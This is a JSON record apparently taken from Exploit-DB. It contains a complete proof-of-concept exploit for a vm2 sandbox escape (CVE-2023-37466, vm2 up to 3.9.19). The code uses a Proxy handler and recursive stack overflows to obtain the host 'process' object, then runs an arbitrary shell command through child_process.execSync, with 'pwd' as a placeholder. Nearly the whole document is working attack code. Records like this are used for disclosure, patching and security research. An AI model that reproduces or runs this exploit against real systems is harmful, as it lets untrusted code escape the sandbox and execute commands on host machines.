{"source": "https://www.exploit-db.com/exploits/51898", "vulnName": "vm2 - sandbox escape", "vulnEDBID": "51898", "vulnCVE": "N/A", "author": "CALIL KHALIL", "exploitType": "LOCAL", "platform": "MULTIPLE", "datePublished": "2024-03-16", "vulnContent": "/*\n# Exploit Title: vm2 Sandbox Escape vulnerability\n# Date: 23/12/2023\n# Exploit Author: Calil Khalil & Adriel Mc Roberts\n# Vendor Homepage: https://github.com/patriksimek/vm2\n# Software Link: https://github.com/patriksimek/vm2\n# Version: vm2 <= 3.9.19\n# Tested on: Ubuntu 22.04\n# CVE : CVE-2023-37466\n*/\n\nconst { VM } = require(\"vm2\");\nconst vm = new VM();\n\nconst command = 'pwd'; // Change to the desired command\n\nconst code = `\nasync function fn() {\n    (function stack() {\n        new Error().stack;\n        stack();\n    })();\n}\n\ntry {\n    const handler = {\n        getPrototypeOf(target) {\n            (function stack() {\n                new Error().stack;\n                stack();\n            })();\n        }\n    };\n\n    const proxiedErr = new Proxy({}, handler);\n\n    throw proxiedErr;\n} catch ({ constructor: c }) {\n    const childProcess = c.constructor('return process')().mainModule.require('child_process');\n    childProcess.execSync('${command}');\n}\n`;\n\nconsole.log(vm.run(code));\n            "}